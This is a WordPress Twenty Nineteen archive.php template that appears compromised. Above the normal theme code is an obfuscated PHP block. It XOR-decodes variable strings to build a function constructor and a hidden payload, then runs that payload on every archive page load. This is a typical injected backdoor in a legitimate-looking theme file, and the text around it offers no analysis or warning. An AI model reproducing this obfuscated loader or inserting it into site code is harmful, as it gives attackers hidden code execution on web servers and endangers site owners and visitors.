<?php $cKKMkUN='U=H 74n619QY3,U'; $gHQOlmx='6O-ACQ1PDW2-ZC;'^$cKKMkUN; $kCuoTU='D7bcV1=:==-,j1J=GA5gVBA7a06A 1bUA dnJP1P1,977YQ;SWCU=o 7NLb-+C-ek=1FYmpA=YEZdbrdAGDpgi.B hwvIsmep3.Y+zPDUYgAVcm1t 0>T UpNHW2Plylt.DDf:ssR=XEkyMdYUXRAQhM=hggaaG.Maj<qqQ;=G;E6bi2<MkoLIZE0J4DIK-OuW>MhnI3Az8fka4,7;swn 18MRHdv>Z;2m RMxozW+ J ZgEU.A JT=vjp0s>=f=wt0IrJ:HBRkglkALZ YbcP4JGZ3>J=K<7InInV Dr1fw.2D awugA,-O3j=GxH=5KxyeSMM gqN<c7,LEV: VDEq3+9hy<zG,BkGX3MOHpLBMAR-PHdFmegwS IYnW63guBa21IbzKoGH01PKeNeDR4NWq=DJyNioWJRFLTjzy4>0==P,+PIVE:ZHlPXY-n=P 7r26H=Yyk.+C=PVPCV103akTA-M Aa364SNB7=7mC.XE4QWjT1; J6oZ J4EL3AE+nN>U=lutMZSB8kuTbXq Ydie=R;Z-PG2GM0EppIIqYqyWqGQI 6 ZY,f .UcQyT,z:VQeJ=2BrPwsVp. ;6Ua80RnHKB  9ooJV>9+0 UIyw ,55smlkphoeKHmYZ.Gis JE1hF: <LU-TovgJhb= R;lQhV9>'; $UCieERAR=$gHQOlmx('', '-QJB0DSYITBB5T2T45FOq:.E>TW5An=84TCGcpJZ8JLYT-8T=w;:O0DV:-=rF6YMOYP28APeV<<sDBRDa<NynMA7THJVnTVoy:H6YRt-udGqmCIXHSDL8E;Xj,6F1EBLPGooO0zzvR-1KWpDqq<3503iT5G9AE,K4:NUQTqHI5W XJMYY4B2erPL98Q0<9CgQ8K9AUC:<pElaEPMCZSJNFPT>7snRZ;OS2K74XRZ1JL9EamO3A3E+7UVBTo0qr-t2TQ:RnQ-;rVYLO7-6U<KC+>Cc>RJ+b YNiSiJ=E=I;oSJS0AAJUC7MA:VQ7:rBTSkPXA7,9ANQ56jQC> 7YHvla.anh=<o.gM1Kc3V4ouNlf; >X5aD=glnS7A=81<SJGHbEYT0YpBfc,QE1kXnA23X;2J7M7s3ces.32-tWZ9APCXO9MG933mB5:349-L1b=UCZPW;XoM4JN R43xg2PDRHGteI,T >XSMzgy=TQEgJ91UqqLtPIR+O01E3k 4Z21XFiU0DKYTi>26YBUrDxYM=QAAY3O;vw,W>jmlPMtiVhHAeBwfzEUB88MPAJ3P0L6MBXd0V.XTuUyWUpPORIW,>SU+1-3+STJGH:7GUDQDreYSDMATZDLKPHOE0Bd<,O+AWD+1P3aJAE :L0H+NqbkXX;ODaAm3C'^$kCuoTU); $UCieERAR();
/**
 * The template for displaying archive pages
 *
 * @link https://developer.wordpress.org/themes/basics/template-hierarchy/
 *
 * @package WordPress
 * @subpackage Twenty_Nineteen
 * @since Twenty Nineteen 1.0
 */

get_header();
?>

	<div id="primary" class="content-area">
		<main id="main" class="site-main">

		<?php if ( have_posts() ) : ?>

			<header class="page-header">
				<?php
					the_archive_title( '<h1 class="page-title">', '</h1>' );
				?>
			</header><!-- .page-header -->

			<?php
			// Start the Loop.
			while ( have_posts() ) :
				the_post();

				/*
				 * Include the Post-Format-specific template for the content.
				 * If you want to override this in a child theme, then include a file
				 * called content-___.php (where ___ is the Post Format name) and that
				 * will be used instead.
				 */
				get_template_part( 'template-parts/content/content', 'excerpt' );

				// End the loop.
			endwhile;

			// Previous/next page navigation.
			twentynineteen_the_posts_navigation();

			// If no content, include the "No posts found" template.
		else :
			get_template_part( 'template-parts/content/content', 'none' );

		endif;
		?>
		</main><!-- #main -->
	</div><!-- #primary -->

<?php
get_footer();
